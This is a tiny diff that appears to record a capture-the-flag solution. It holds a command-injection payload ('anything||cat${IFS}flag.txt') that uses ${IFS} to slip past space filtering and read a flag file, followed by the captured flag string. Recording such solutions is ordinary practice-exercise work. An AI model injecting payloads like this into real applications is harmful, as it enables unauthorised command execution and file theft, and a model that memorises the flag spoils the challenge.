@@ -1,0 +1,3 @@
+1. anything||cat${IFS}flag.txt -> gej injectleel
+
+flag : HZU18{NiC#_J0B_CongR@TZZZZZ!_21a2757cf9069ee0}
